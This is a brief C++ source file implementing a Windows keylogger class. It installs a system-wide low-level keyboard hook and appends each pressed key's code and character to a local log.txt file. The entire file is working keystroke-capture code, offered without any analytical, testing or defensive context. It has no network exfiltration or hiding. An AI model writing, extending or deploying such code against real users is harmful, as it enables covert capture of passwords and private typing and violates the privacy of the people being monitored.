#include "Includes.h"

LRESULT Keylogger::HookProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        std::ofstream logFile;
        logFile.open("log.txt", std::ios::app);

        if (logFile.is_open()) {
            logFile << "Key was pressed: " << vkCode << " (char: " << (char)vkCode << ")" << std::endl;
            logFile.close();
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

int Keylogger::Init() {
    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, Keylogger::HookProc, NULL, 0);
    if (hhook == NULL) { printf("Hook wasn't installed\n"); return -1; }

    MSG msg;
    BOOL bRet;
    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
        if (bRet == -1) return -1;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
